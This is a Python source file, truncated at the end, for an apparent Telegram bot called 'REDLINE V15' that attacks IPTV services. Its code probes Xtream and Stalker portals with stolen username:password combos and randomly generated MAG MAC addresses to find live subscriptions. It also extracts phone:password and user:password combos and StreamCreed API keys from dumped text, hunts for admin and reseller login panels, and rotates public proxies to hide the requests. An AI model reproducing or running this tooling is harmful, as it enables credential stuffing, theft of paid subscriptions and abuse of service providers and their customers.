        lines.append(f" Created: {info.get('created','-')}")
        lines.append(f" Expires: {info.get('expires','-')}")
        if info.get('channels'):
            lines.append(f" Content Channels: {info.get('channels')}")
        lines.append(f" M3U: {info.get('m3u','-')}")
        lines.append(f" API: {info.get('api','-')}")
        return "\n".join(lines)

class UpProbe:
    @staticmethod
    def build_m3u(host: str, username: str, password: str) -> str:
        if not host.startswith(('http://','https://')):
            host = 'http://' + host
        base = host.rstrip('/')
        return f"{base}/get.php?username={username}&password={password}&type=m3u_plus"

    @staticmethod
    def probe_up(host: str, username: str, password: str, timeout: int = 8, proxies: dict | None = None) -> Tuple[bool, Dict, str]:
        url = UpProbe.build_m3u(host, username, password)
        return M3UProbe.probe(url, timeout=timeout, proxies=proxies)

class MACProbe:
    """MAC address IPTV portal probe (Stalker/MAG portals)"""
    
    @staticmethod
    def probe_mac(host: str, mac: str, timeout: int = 8, proxies: dict | None = None) -> Tuple[bool, Dict, str]:
        """Probe IPTV host with MAC address"""
        if not HAS_REQUESTS:
            return False, {}, "requests not installed"
        
        try:
            # Normalize host
            if not host.startswith(('http://', 'https://')):
                host = 'http://' + host
            base = host.rstrip('/')
            
            # Common MAC portal endpoints (Stalker/MAG portals)
            endpoints = [
                f"{base}/stalker_portal/server/load.php?type=stb&action=handshake&token=&mac={mac}",
                f"{base}/portal.php?type=stb&action=handshake&token=&mac={mac}",
                f"{base}/c/index.php?mac={mac}",
                f"{base}/server/load.php?type=stb&action=handshake&mac={mac}",
                f"{base}/api/v2/auth?mac={mac}",
            ]
            
            for endpoint in endpoints:
                try:
                    r = Net.get(
                        endpoint, 
                        timeout=timeout, 
                        proxies=proxies,
                        headers={"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
                    )
                    
                    if r.status_code == 200:
                        content = r.text.lower()
                        # Check for valid portal response
                        if any(word in content for word in ['token', 'handshake', 'js', 'profile', 'cmd', 'expires']):
                            info = {
                                'mac': mac,
                                'host': host,
                                'endpoint': endpoint.split('?')[0],  # Clean endpoint
                                'status': 'Active',
                                'response_size': len(r.text)
                            }
                            return True, info, ''
                except Exception:
                    continue
            
            return False, {}, "MAC portal not found or inactive"
            
        except Exception as e:
            return False, {}, f"Error: {str(e)}"
    
    @staticmethod
    def format_mac_result(info: Dict) -> str:
        """Format MAC probe result"""
        lines = [
            "----------------------------",
            f"●► MAC: {info.get('mac', '-')}",
            f"●► Host: {info.get('host', '-')}",
            f"●► Endpoint: {info.get('endpoint', '-')}",
            f"●► Status: {info.get('status', '-')}",
            f"●► Response Size: {info.get('response_size', 0)} bytes",
            "----------------------------"
        ]
        return "\n".join(lines)

# ============================================
# MAC CONVERTERS - PHASE 1
# ============================================

class MACConverter:
    """MAC format converters"""
    
    @staticmethod
    def _generate_mac() -> str:
        import random
        prefixes = [
            (0x00, 0x1A, 0x79),  # Infomir/MAG
            (0x00, 0x1E, 0xB8),
            (0x00, 0x1F, 0xFB),
        ]
        p = random.choice(prefixes)
        tail = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        parts = list(p) + list(tail)
        return ":".join(f"{b:02X}" for b in parts)

    @staticmethod
    def m3u_to_mac(m3u_text: str, mac_address: str | None = None) -> Set[str]:
        """Convert M3U URLs to MAC live.php URLs using extracted stream ids"""
        results = set()
        if not mac_address:
            mac_address = MACConverter._generate_mac()
        
        for line in m3u_text.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            try:
                parsed = re.search(r"https?://([^/]+)(/.+)", line, re.IGNORECASE)
                if not parsed:
                    continue
                host = parsed.group(1)
                stream_id = None
                m = re.search(r"[?&]stream=(\d+)", line)
                if m:
                    stream_id = m.group(1)
                if not stream_id:
                    m = re.search(r"/(?:live|movie|series)/[^/]+/[^/]+/(\d+)\.(?:ts|m3u8|mp4)", line, re.IGNORECASE)
                    if m:
                        stream_id = m.group(1)
                if not stream_id:
                    m = re.search(r"/(\d+)\.(?:ts|m3u8|mp4)", line, re.IGNORECASE)
                    if m:
                        stream_id = m.group(1)
                if host and stream_id:
                    results.add(f"http://{host}/play/live.php?mac={mac_address}&stream={stream_id}&extension=ts")
            except Exception:
                continue
        return results

    @staticmethod
    def mac_to_m3u(host: str, mac_address: str, timeout: int = 10) -> Tuple[List[Dict], str]:
        """Fetch channels via portal API and return list of channels (id,name,number,url), or error"""
        if not HAS_REQUESTS:
            return ([], "requests not installed")
        try:
            if not host.startswith(('http://', 'https://')):
                host = 'http://' + host
            from urllib.parse import urlparse
            p = urlparse(host)
            base = f"{p.scheme}://{p.netloc}"
            sess = requests.Session()
            try:
                sess.cookies.update({"mac": mac_address})
            except Exception:
                pass
            # handshake
            try:
                r = sess.get(f"{base}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml", timeout=timeout, allow_redirects=False)
                data = r.json() if r.text.strip().startswith('{') else {}
                token = (data.get('js') or {}).get('token')
            except Exception:
                token = None
            if not token:
                return ([], "Failed to get token from portal")
            headers = {"Authorization": f"Bearer {token}"}
            # channels
            try:
                r = sess.get(f"{base}/server/load.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml", headers=headers, timeout=timeout, allow_redirects=False)
                if r.status_code != 200:
                    return ([], f"HTTP {r.status_code}")
                data = r.json() if r.text.strip().startswith('{') else {}
                arr = (data.get('js') or {}).get('data') or []
                out: List[Dict] = []
                for ch in arr[:500]:
                    try:
                        out.append({
                            'id': ch.get('id', ''),
                            'name': ch.get('name', 'Unknown'),
                            'number': ch.get('number', '0'),
                            'url': ch.get('cmd', ''),
                            'group': ch.get('tv_genre_title') or ch.get('genre_title') or ch.get('genre') or ch.get('cat_title') or ''
                        })
                    except Exception:
                        continue
                return (out, "")
            except Exception as e:
                return ([], f"Channels error: {str(e)}")
        except Exception as e:
            return ([], f"Error: {str(e)}")

    @staticmethod
    def mac_profile(host: str, mac_address: str, timeout: int = 8) -> Dict:
        """Best-effort fetch of subscription/profile info (may include expiry)."""
        if not HAS_REQUESTS:
            return {}
        try:
            if not host.startswith(('http://', 'https://')):
                host = 'http://' + host
            from urllib.parse import urlparse
            p = urlparse(host)
            base = f"{p.scheme}://{p.netloc}"
            sess = requests.Session()
            try:
                sess.cookies.update({"mac": mac_address})
            except Exception:
                pass
            # handshake
            token = None
            try:
                r = sess.get(f"{base}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml", timeout=timeout, allow_redirects=False)
                data = r.json() if r.text.strip().startswith('{') else {}
                token = (data.get('js') or {}).get('token')
            except Exception:
                pass
            if not token:
                return {}
            headers = {"Authorization": f"Bearer {token}"}
            # try profile endpoint
            try:
                r = sess.get(f"{base}/server/load.php?type=stb&action=get_profile&JsHttpRequest=1-xml", headers=headers, timeout=timeout, allow_redirects=False)
                data = r.json() if r.text.strip().startswith('{') else {}
                js = data.get('js') or {}
                # look for common expiry fields
                exp = js.get('end_date') or js.get('expire_date') or js.get('billing_date') or js.get('expire_billing_date') or ''
                return {"expires": str(exp)} if exp else {}
            except Exception:
                return {}
        except Exception:
            return {}

# ============================================
# PANEL TOOLS - PHASE 1 (basic, fast)
# ============================================

class PanelSearcher:
    """Find IPTV/Xtream-like panel URLs in text (REDLINE-matched scoring)"""
    URL_RE = re.compile(r'https?://[^\s<>"{}|\\^`\[\]]+', re.IGNORECASE)

    # ===== Constants from REDLINE (trimmed but equivalent) =====
    PANEL_PATH_HINTS: List[str] = [
        r":\d{2,5}/login\.(php|asp|cgi|jsp|aspx|htm|html)(\?|$)",
        r":\d{2,5}/admin(\?|/|$)",
        r":\d{2,5}/panel(\?|/|$)",
        r":\d{2,5}/dashboard(\?|/|$)",
        r"/(xui|xtream|player_api|stalker|mag|iptv)/?",
        r"/(clientarea|signin|authenticate|cpanel|manager|control|portal|reseller)/?",
        r"/(login|Login)\.(php|asp|jsp|html?)",
    ]
    PANEL_HOST_HINTS: List[str] = [
        "iptv", "ott", "xui", "xc", "xtream", "stalker", "m3u", "mag",
        "xstream", "vpanel", "portal", "4kpanel", "smartiptv", "tvpanel",
        "panel", "reseller", "admin", "dashboard", "cms"
    ]
    PANEL_QUERY_HINTS: List[str] = [
        "referrer=", "ReturnURL=", "rp=/login", "action=login",
        "username=", "password=", "user=", "pass=", "next=",
        "style=", "redirect=", "return_url=", "continue="
    ]
    KNOWN_IPTV_PORTS: Set[int] = {
        80, 443, 1088, 1980, 1992, 1993, 2052, 2080, 2082, 2083, 2086, 2087, 2088, 2095, 2096,
        3000, 3001, 3388, 5555, 5588, 5656, 6688, 6888, 6969, 7392, 7488, 7688, 7720, 7788, 7888,
        8000, 8001, 8010, 8079, 8080, 8081, 8087, 8088, 8181, 8288, 8443, 8877, 8880, 8888,
        9000, 9080, 9443, 9999, 10000, 16000, 20000, 25461, 25500, 25600
    }
    NON_PANEL_KEYWORDS = [
        "checkout", "cart", "order", "payment", "bank", "insurance",
        "university", "passport", "ticket", "shop", "store", "ecommerce",
        "career", "jobs", "hroffice", "instagram", "skyscanner",
    ]
    PANEL_PATH_RE = re.compile("|".join(PANEL_PATH_HINTS), re.IGNORECASE)
    HASH_PATH_RE = re.compile(r"/[A-Za-z0-9]{8,12}/(login|dashboard)", re.IGNORECASE)
    SPA_PATTERN_RE = re.compile(r"/#/(login|auth|dashboard)", re.IGNORECASE)
    ENCODED_PATH_RE = re.compile(r"/admin/index/[A-Za-z0-9=]+")
    PANEL_TYPE_RE = re.compile(r"/(pntv|iptv|cms)/login\.php", re.IGNORECASE)
    IPTV_PATH_RE = re.compile(r"/(iptv|xui|stalker|mag|xtream|panel|admin|reseller|dashboard)\b", re.IGNORECASE)
    PORT_PATH_RE = re.compile(r"/\d{2,5}/(login|admin|panel)", re.IGNORECASE)
    ACCOUNT_PATTERN_RE = re.compile(r"/(Account|account)/(Login|Signin)")
    LOGIN_PATTERN_RE = re.compile(r"/(login|signin|auth|authenticate|clientarea)\.(php|asp|jsp|html?)", re.IGNORECASE)

    @staticmethod
    def score_panel_url(u: str) -> Tuple[int, Set[str], str]:
        reasons: Set[str] = set()
        try:
            p = urlparse(u)
            host = (p.hostname or "").lower()
            path = (p.path or "/").lower()
            query = (p.query or "").lower()
            score = 0

            # Path & special patterns
            if PanelSearcher.PANEL_PATH_RE.search(path):
                score += 3; reasons.add("path")
            if PanelSearcher.HASH_PATH_RE.search(path):
                score += 6; reasons.add("hash_path")
            if PanelSearcher.SPA_PATTERN_RE.search(path):
                score += 5; reasons.add("spa_pattern")
            if PanelSearcher.ENCODED_PATH_RE.search(path):
                score += 5; reasons.add("encoded_path")
            if PanelSearcher.PANEL_TYPE_RE.search(path):
                score += 5; reasons.add("panel_type")
            if PanelSearcher.IPTV_PATH_RE.search(path):
                score += 2; reasons.add("iptv_path")
            if PanelSearcher.PORT_PATH_RE.search(path):
                score += 3; reasons.add("port_path")
            if PanelSearcher.ACCOUNT_PATTERN_RE.search(path):
                score += 4; reasons.add("account_pattern")
            if PanelSearcher.LOGIN_PATTERN_RE.search(path):
                score += 4; reasons.add("login_pattern")

            # Host hints
            host_hits = sum(1 for h in PanelSearcher.PANEL_HOST_HINTS if h in host)
            if host_hits:
                score += min(host_hits, 4)
                reasons.add("host")
            iptv_matches = sum(1 for k in ["iptv","xui","xtream","stalker","panel","reseller"] if k in host)
            if iptv_matches:
                score += min(iptv_matches * 2, 6)
                reasons.add("iptv_host")

            # Subdomain patterns
            if any(host.startswith(sub) for sub in ["cms.","panel.","reseller.","my.","dashboard.","admin."]):
                score += 3; reasons.add("subdomain")

            # Port scoring
            if p.port:
                if p.port in PanelSearcher.KNOWN_IPTV_PORTS:
                    if p.port in [8087,8080,2082,25500,2052,8880]:
                        score += 5
                    else:
                        score += 4
                    reasons.add("known_port")
                elif p.port in [80,443]:
                    score += 1; reasons.add("standard_port")
                else:
                    score += 2; reasons.add("custom_port")

            # Query hints
            if any(q in query for q in ["rp=/login","returnurl=","referrer=","next="]):
                score += 2; reasons.add("query")
            elif any(q in query for q in PanelSearcher.PANEL_QUERY_HINTS):
                score += 1; reasons.add("query")

            # Penalties
            if ("iptv_host" in reasons) and not ("path" in reasons or "iptv_path" in reasons or "known_port" in reasons or "query" in reasons):
                if (path or "/").strip() in ("","/"):
                    score -= 2; reasons.add("host_only")
            if not ("iptv_path" in reasons or "iptv_host" in reasons or "known_port" in reasons):
                if any(k in host or k in path for k in PanelSearcher.NON_PANEL_KEYWORDS):
                    score -= 2; reasons.add("nonpanel")

            normalized = f"{p.scheme}://{p.netloc}{p.path}"
            return score, reasons, normalized
        except Exception:
            return 0, set(), u

    @staticmethod
    def find(text: str) -> Set[str]:
        panels: Set[str] = set()
        for url in PanelSearcher.URL_RE.findall(text):
            try:
                parsed = urlparse(url)
                if parsed.scheme not in ("http","https") or not parsed.netloc:
                    continue
                score, reasons, norm = PanelSearcher.score_panel_url(url)
                iptv_like = ("iptv_path" in reasons) or ("iptv_host" in reasons) or ("known_port" in reasons)
                accept = False
                if ("known_port" in reasons and ("iptv_path" in reasons or "iptv_host" in reasons) and score >= 4):
                    accept = True
                elif (("iptv_host" in reasons and "iptv_path" in reasons) and score >= 4):
                    accept = True
                elif ("iptv_host" in reasons and score >= 5 and ("path" in reasons or "subdomain" in reasons or "query" in reasons or "hash_path" in reasons or "spa_pattern" in reasons)):
                    accept = True
                elif (score >= 6 and iptv_like):
                    accept = True
                if accept and len(norm) <= 120:
                    panels.add(norm)
            except Exception:
                continue
        return panels

class PanelChecker:
    """HEAD check for panel alive/dead"""
    @staticmethod
    def check(url: str, timeout: int = 5, proxies: dict | None = None) -> Tuple[str, bool, str]:
        if not HAS_REQUESTS:
            return (url, False, "❌ requests not installed")
        try:
            r = requests.head(url, timeout=timeout, allow_redirects=True, proxies=proxies)
            if r.status_code == 200:
                return (url, True, "✅ ALIVE")
            elif r.status_code == 403:
                return (url, False, "🔒 FORBIDDEN")
            elif r.status_code == 404:
                return (url, False, "❌ NOT FOUND")
            else:
                return (url, False, f"⚠️ CODE {r.status_code}")
        except requests.exceptions.Timeout:
            return (url, False, "⏱️ TIMEOUT")
        except requests.exceptions.ConnectionError:
            return (url, False, "🔌 CONN ERROR")
        except Exception:
            return (url, False, "❌ ERROR")

# ============================================
# PHASE 2 UTILITIES
# ============================================

class WHOISLookup:
    @staticmethod
    def _is_ip(s: str) -> bool:
        return bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", s))

    @staticmethod
    def _resolve_ip(domain: str) -> str:
        try:
            return socket.gethostbyname(domain)
        except Exception:
            return ''

    @staticmethod
    def _geo_ip(ip: str, timeout: int = 8) -> Dict:
        try:
            r = Net.get(f"https://ipapi.co/{ip}/json/", timeout=timeout)
            return r.json() if r.status_code == 200 else {}
        except Exception:
            return {}

    @staticmethod
    def _rdap_domain(domain: str, timeout: int = 12) -> Dict:
        try:
            r = Net.get(f"https://rdap.org/domain/{domain}", timeout=timeout)
            return r.json() if r.status_code == 200 else {}
        except Exception:
            return {}

    @staticmethod
    def _dns_ns(domain: str, timeout: int = 8) -> List[Dict]:
        out = []
        try:
            r = Net.get(f"https://dns.google/resolve?name={domain}&type=NS", timeout=timeout)
            if r.status_code == 200:
                js = r.json()
                for ans in js.get('Answer', []) or []:
                    host = ans.get('data','').rstrip('.')
                    if host:
                        # resolve NS IP
                        ip = ''
                        try:
                            rr = Net.get(f"https://dns.google/resolve?name={host}&type=A", timeout=timeout)
                            if rr.status_code == 200:
                                arr = rr.json().get('Answer', []) or []
                                if arr:
                                    ip = arr[0].get('data','')
                        except Exception:
                            pass
                        asn = country = org = ''
                        if ip:
                            gi = WHOISLookup._geo_ip(ip, timeout=6)
                            asn = str(gi.get('asn','')) + ' ' + str(gi.get('org','')) if gi.get('asn') else str(gi.get('org',''))
                            country = gi.get('country_name','') or gi.get('country','')
                        out.append({'host': host, 'ip': ip, 'asn': asn.strip(), 'country': country})
        except Exception:
            pass
        return out

    @staticmethod
    def _reverse_ip(ip: str, timeout: int = 12, limit: int = 100) -> List[str]:
        # Use rapiddns sameip page (HTML) and parse domains
        try:
            url = f"https://rapiddns.io/sameip/{ip}?full=1#result"
            r = Net.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code != 200:
                return []
            domains = set()
            for m in re.finditer(r">([A-Za-z0-9._-]+\.[A-Za-z]{2,})<", r.text):
                d = m.group(1)
                # ignore obvious TLD artifacts
                if len(d) <= 2 or d.endswith('...'):
                    continue
                domains.add(d)
                if len(domains) >= limit:
                    break
            return sorted(domains)
        except Exception:
            return []

    @staticmethod
    def whois_report(target: str) -> Tuple[str, str]:
        if not HAS_REQUESTS:
            return (target, "requests not installed")
        t = target.strip()
        domain = t
        ip = t if WHOISLookup._is_ip(t) else ''
        if not ip:
            ip = WHOISLookup._resolve_ip(domain)

        # Reverse IP
        rev_domains = WHOISLookup._reverse_ip(ip) if ip else []
        # Cap preview in report for readability
        preview_limit = 40
        preview_domains = rev_domains[:preview_limit]
        # NS & protection
        ns_list = WHOISLookup._dns_ns(domain) if not WHOISLookup._is_ip(domain) else []
        has_cf = any('cloudflare' in (ns.get('host','')) for ns in ns_list)
        provider = 'cloudflare' if has_cf else 'none'
        cloudflare = 'YES' if has_cf else 'NO'
        bypass = 'NO' if has_cf else 'YES' if provider != 'none' else 'NO'
        # RDAP WHOIS
        rdap = WHOISLookup._rdap_domain(domain) if not WHOISLookup._is_ip(domain) else {}
        # GEO
        geo = WHOISLookup._geo_ip(ip) if ip else {}

        # Build report text
        t0 = time.time()
        lines = []
        lines.append("╭═══════════════════════════════════════╮")
        lines.append("             Who is IP/Domain             ")
        lines.append("            ⚡ REDLINE V15 ⚡            ")
        lines.append(f"             🎯  {domain}             ")
        lines.append(f"           🔎 {ip or '-'}            ")
        lines.append("╰═══════════════════════════════════════╯")
        lines.append("")
        lines.append(f"🎯 Scanning target: {domain} 🔎 {ip or '-'}")
        lines.append("--------------------------------------------------")
        lines.append("")
        lines.append("🌐 Reverse DNS Results Summary")
        lines.append("──────────────────────")
        lines.append(f"📊 Source 2: {len(rev_domains)} domains")
        lines.append(f"📊 Total Unique: {len(rev_domains)} domains")
        lines.append("──────────────────────")
        lines.append("")
        lines.append("🔎 Reverse-IP Lookup Results")
        lines.append("──────────────────────")
        lines.append("")
        lines.append("Source 2:")
        if preview_domains:
            row = []
            for i, d in enumerate(preview_domains, 1):
                row.append(f"🔗 {d}")
                if i % 2 == 0:
                    lines.append("          ".join(row))
                    row = []
            if row:
                lines.append("          ".join(row))
            if len(rev_domains) > preview_limit:
                lines.append("")
                lines.append(f"… and {len(rev_domains) - preview_limit} more")
        lines.append("")
        lines.append("──────────────────────")
        lines.append(f"📊 Total Found: {len(rev_domains)} Unique Domains")
        lines.append("──────────────────────")
        lines.append("")
        if not WHOISLookup._is_ip(domain):
            lines.append("🌐 Domain Analysis Results")
            lines.append("──────────────────────")
            lines.append(f"🌐 Domain: {domain}")
            lines.append("")
        lines.append("🌍 GeoIP Lookup:")
        lines.append(f"📍 {domain}")
        lines.append(f"📍 IP: {ip or '-'}")
        if geo:
            lines.append(f"🌍 Country: {geo.get('country_name','-')}")
            lines.append(f"🏢 Region: {geo.get('region','-')}")
            lines.append(f"🏢 City: {geo.get('city','-')}")
        lines.append("")
        lines.append("🔎 DNSDumpster Results")
        lines.append("──────────────────────")
        lines.append("")
        lines.append("🛡️ Name Servers:")
        lines.append("")
        for ns in ns_list[:10]:
            lines.append(f"   - 🌐 Host: {ns['host']}")
            if ns.get('ip'):
                lines.append(f"     - 📍 IP: {ns['ip']}")
            if ns.get('asn'):
                lines.append(f"     - 🏢 ASN: {ns['asn']}")
            if ns.get('country'):
                lines.append(f"     - 🌍 Country: {ns['country']}")
            lines.append("")
        lines.append("──────────────────────")
        lines.append("🔐 Protection Analysis")
        lines.append(f"🔐 Provider: {provider}")
        lines.append(f"{'✅' if bypass=='YES' else '❌'} Bypass: {bypass}")
        lines.append(f"{'✅' if cloudflare=='YES' else '❌'} Cloudflare: {cloudflare}")
        lines.append("──────────────────────")
        lines.append("🌐 Reverse IP Analysis Complete")
        lines.append(f"📊 Found: {len(rev_domains)} unique domains")
        lines.append("──────────────────────")
        lines.append(f"⏱️ Duration: {int(time.time()-t0)}s")
        lines.append(f"🔐 Protection: {provider} | Bypass: {bypass}")
        lines.append(f"🌐 Reverse IP domains: {len(rev_domains)}")
        lines.append("")
        lines.append("──────────────────────")
        lines.append("──────────────────────")
        lines.append("")
        if rdap:
            lines.append(f"---------- WHOIS for {domain} ----------")
            # Basic RDAP fields
            ns_r = rdap.get('nameservers') or []
            registrar = (rdap.get('registrar') or {}).get('name') if isinstance(rdap.get('registrar'), dict) else ''
            events = rdap.get('events') or []
            created = updated = expire = ''
            for ev in events:
                if ev.get('eventAction') == 'registration':
                    created = ev.get('eventDate','')
                elif ev.get('eventAction') == 'expiration':
                    expire = ev.get('eventDate','')
                elif ev.get('eventAction') == 'last changed':
                    updated = ev.get('eventDate','')
            lines.append(f"Registrar: {registrar or '-'}")
            if created:
                lines.append(f"Creation Date: {created}")
            if updated:
                lines.append(f"Updated Date: {updated}")
            if expire:
                lines.append(f"Registry Expiry Date: {expire}")
            if ns_r:
                for ns in ns_r:
                    n = ns.get('ldhName') if isinstance(ns, dict) else str(ns)
                    lines.append(f"Name Server: {n}")
            lines.append("")
        if geo:
            lines.append("---------- Geolocation ----------")
            lines.append(f"Query: {ip}")
            lines.append("Status: success")
            lines.append(f"Country: {geo.get('country_name','-')} ({geo.get('country','-')})")
            lines.append(f"Region: {geo.get('region','-')} ({geo.get('region_code','-')})")
            lines.append(f"City: {geo.get('city','-')}")
            if geo.get('postal'):
                lines.append(f"ZIP: {geo.get('postal')}")
            if geo.get('latitude') and geo.get('longitude'):
                lines.append(f"Lat/Lon: {geo.get('latitude')}, {geo.get('longitude')}")
                lines.append(f"Google Maps: https://www.google.com/maps?q={geo.get('latitude')},{geo.get('longitude')}")
            if geo.get('timezone'):
                lines.append(f"Timezone: {geo.get('timezone')}")
            if geo.get('org'):
                lines.append(f"ISP: {geo.get('org')}")
            if geo.get('asn'):
                lines.append(f"ASN: {geo.get('asn')}")
        lines.append("──────────────────────")
        lines.append(f"📊 Total Unique Domains: {len(rev_domains)}")
        lines.append(f"📅 Scan Date: {datetime.now().strftime('%d %B %Y')}")
        lines.append("──────────────────────")
        lines.append("")
        lines.append(f"💾 Analysis completed at: {datetime.now().strftime('%d %B %Y')}")
        lines.append("────────────────────────────────────────────────────────────")
        return (target, "\n".join(lines))

class KeywordSearcher:
    @staticmethod
    def search(text: str, keywords: List[str]) -> Dict[str, List[str]]:
        res: Dict[str, List[str]] = {}
        low = text.lower().split('\n')
        for kw in [k.strip() for k in keywords if k.strip()]:
            matches = []
            kwl = kw.lower()
            for line in low:
                if kwl in line:
                    matches.append(line.strip())
            if matches:
                res[kw] = matches[:1000]
        return res

class StreamCreedFinder:
    PATTERNS = [
        r'streamcreed[._-]?key["\s:=]+([A-Za-z0-9_-]{20,64})',
        r'sc[._-]?key["\s:=]+([A-Za-z0-9_-]{20,64})',
        r'apikey["\s:=]+([A-Za-z0-9_-]{32,64})',
    ]
    @staticmethod
    def find(text: str) -> Set[str]:
        out: Set[str] = set()
        for pat in StreamCreedFinder.PATTERNS:
            for m in re.finditer(pat, text, re.IGNORECASE):
                key = m.group(1)
                if len(key) >= 20:
                    out.add(key)
        return out

class ProxyFinder:
    SOURCES = [
        "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    @staticmethod
    def fetch(max_proxies: int = 200, timeout: int = 10) -> List[str]:
        if not HAS_REQUESTS:
            return []
        out: List[str] = []
        for src in ProxyFinder.SOURCES:
            try:
                r = Net.get(src, timeout=timeout)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if ':' in line and len(line.split(':')) == 2:
                            out.append(line)
                            if len(out) >= max_proxies:
                                return out
            except Exception:
                continue
        return out

    @staticmethod
    def test(proxy: str, timeout: int = 4) -> bool:
        if not HAS_REQUESTS:
            return False
        try:
            # Accept full URLs or host:port; test both http/https if no scheme
            candidates: List[str] = []
            if '://' in proxy:
                candidates = [proxy]
            else:
                candidates = [f'http://{proxy}', f'https://{proxy}']
            for px in candidates:
                proxies = {'http': px, 'https': px}
                try:
                    # Try HTTPS first for better coverage
                    r = Net.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
                    if r.status_code == 200:
                        return True
                except Exception:
                    pass
                try:
                    r = Net.get('http://httpbin.org/ip', proxies=proxies, timeout=timeout)
                    if r.status_code == 200:
                        return True
                except Exception:
                    pass
            return False
        except Exception:
            return False

    @staticmethod
    def fetch_and_validate(max_fetch: int = 200, validate_top: int = 50, workers: int = 20, timeout: int = 5) -> Tuple[List[str], List[str]]:
        """Fetch proxies from sources and validate a subset in parallel."""
        all_list = ProxyFinder.fetch(max_proxies=max_fetch, timeout=timeout)
        to_test = all_list[:validate_top]
        working: List[str] = []
        if to_test:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(ProxyFinder.test, p, timeout): p for p in to_test}
                for fu in as_completed(futs):
                    try:
                        ok = fu.result()
                        if ok:
                            working.append(futs[fu])
                    except Exception:
                        pass
        return all_list, working

# ============================================
# HEALTH CHECK WEB SERVER (for Koyeb)
# ============================================

class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path in ('/', '/health', '/status'):
                body = b'OK'
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                body = b'Not Found'
                self.send_response(404)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
        except Exception:
            pass

def start_health_server():
    try:
        port = int(os.environ.get('PORT', '8000'))
        server = HTTPServer(('', port), _HealthHandler)
        th = threading.Thread(target=server.serve_forever, daemon=True)
        th.start()
        logger.info(f"🌐 Health server listening on port {port}")
        
        # Start keep-alive ping to prevent Koyeb sleep
        _start_keepalive_ping(port)
    except Exception as e:
        logger.warning(f"Health server failed to start: {e}")

def _start_keepalive_ping(port: int):
    """Ping health endpoint every 4 minutes to prevent Koyeb sleep (5min timeout)"""
    def ping_loop():
        import time
        while True:
            try:
                time.sleep(240)  # 4 minutes
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect(('127.0.0.1', port))
                sock.sendall(b'GET /health HTTP/1.1\r\nHost: localhost\r\n\r\n')
                sock.recv(100)
                sock.close()
                logger.debug("Keep-alive ping sent")
            except Exception:
                pass
    
    th = threading.Thread(target=ping_loop, daemon=True)
    th.start()
    logger.info("✅ Keep-alive mechanism started (4min interval)")

# ============================================
# GLOBAL ERROR HANDLER
# ============================================

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err = context.error
    # Ignore duplicate polling conflicts during rolling deploys
    if isinstance(err, telegram.error.Conflict):
        logger.warning("⚠️ Conflict detected: another bot instance polling. This is normal during Koyeb restarts.")
        return
    # Ignore network timeout errors (will retry automatically)
    if isinstance(err, (telegram.error.NetworkError, telegram.error.TimedOut)):
        logger.warning(f"⚠️ Network error (will retry): {err}")
        return
    logger.error(f"❌ Unhandled error: {err}")

# ============================================
# M3U CONVERTERS - TIER 1 FEATURE
# ============================================

class M3UConverter:
    """M3U and Combo converters"""
    
    @staticmethod
    def m3u_to_combo(m3u_text: str) -> Set[str]:
        """Convert M3U links to username:password"""
        results = set()
        
        for line in m3u_text.split('\n'):
            if 'get.php' in line and 'username=' in line and 'password=' in line:
                try:
                    user_match = re.search(r'username=([^&\s]+)', line)
                    pass_match = re.search(r'password=([^&\s]+)', line)
                    
                    if user_match and pass_match:
                        results.add(f"{user_match.group(1)}:{pass_match.group(1)}")
                except:
                    pass
        
        return results
    
    @staticmethod
    def combo_to_m3u(combo_text: str, base_url: str = None) -> Set[str]:
        """Convert username:password to M3U format"""
        results = set()
        
        for line in combo_text.split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    username, password = parts
                    if base_url:
                        m3u_url = f"{base_url}/get.php?username={username}&password={password}&type=m3u_plus"
                        results.add(m3u_url)
                    else:
                        results.add(f"{username}:{password}")
        
        return results

# ============================================
# REDLINE EXTRACTION ENGINE
# ============================================

class RedlineExtractor:
    """
    Complete extraction engine with all REDLINE V15.0 features
    Contains all regex patterns and extraction logic
    """
    
    @staticmethod
    def extract_np(text: str) -> Set[str]:
        """
        Extract N:P (Phone:Password) combos
        Supports international formats and various separators
        """
        results = set()
        
        # Clean text first
        text = re.sub(r'::+', ':', text)
        text = re.sub(r'[;,| ]+', ':', text)
        
        # Phone number patterns
        patterns = [
            # International format with + 
            r'(\+\d{7,15}):([^\s:]+)',
            # Standard phone numbers
            r'(\d{10,15}):([a-zA-Z0-9@#$%^&*!_\-]+)',
            # With country code
            r'(\d{1,4}[\s-]?\d{7,14}):([^\s:]+)',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, text, re.MULTILINE):
                phone = match.group(1).strip()
                password = match.group(2).strip()
                
                # Validation
                if len(password) >= 4 and len(phone) >= 7:
                    # Clean phone number
                    phone = re.sub(r'[^\d+]', '', phone)
                    if phone:
                        results.add(f"{phone}:{password}")
        
        return results
    
    @staticmethod
    def extract_up(text: str) -> Set[str]:
        """
        Extract U:P (Username:Password) combos
